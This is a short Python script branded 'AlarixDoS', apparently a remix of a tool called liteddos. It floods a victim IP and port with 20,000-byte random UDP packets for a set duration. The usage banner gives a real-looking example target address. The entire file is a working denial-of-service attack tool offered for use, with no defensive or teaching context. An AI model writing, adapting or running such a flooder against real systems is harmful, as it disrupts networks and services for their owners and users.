# liteddos remix :)
import time
import socket
import random
import sys
from colorama import Fore, init
init()
def usage():
    print(Fore.RED + """
           _            _      _____            
     /\   | |          (_)    |  __ \           
    /  \  | | __ _ _ __ ___  _| |  | | ___  ___  
   / /\ \ | |/ _` | '__| \ \/ / |  | |/ _ \/ __| 
  / ____ \| | (_| | |  | |>  <| |__| | (_) \__ \ 
 /_/    \_\_|\__,_|_|  |_/_/\_\_____/ \___/|___/ 
    By AlarixDev | LITEDDOS remix | 4L13199 | Do not sell.                                    
    Example: python alarixdos.py 104.27.190.77 8080 100                                   
\n""")

def flood(victim, vport, duration):
    # Support us yaakk... :)
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print(Fore.GREEN + "Sending packet...")
def main():
    print(len(sys.argv))
    if len(sys.argv) != 4:
        usage()
    else:
        print(Fore.RED + """
           _            _      _____            
     /\   | |          (_)    |  __ \           
    /  \  | | __ _ _ __ ___  _| |  | | ___  ___  
   / /\ \ | |/ _` | '__| \ \/ / |  | |/ _ \/ __| 
  / ____ \| | (_| | |  | |>  <| |__| | (_) \__ \ 
 /_/    \_\_|\__,_|_|  |_/_/\_\_____/ \___/|___/ 
           By AlarixDev | LITEDDOS remix | 4L13199                                     
           Example: python alarixdos.py 104.27.190.77 8080 100                                   
\n""")
        print(Fore.YELLOW + "Loading...")
        time.sleep(3)
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()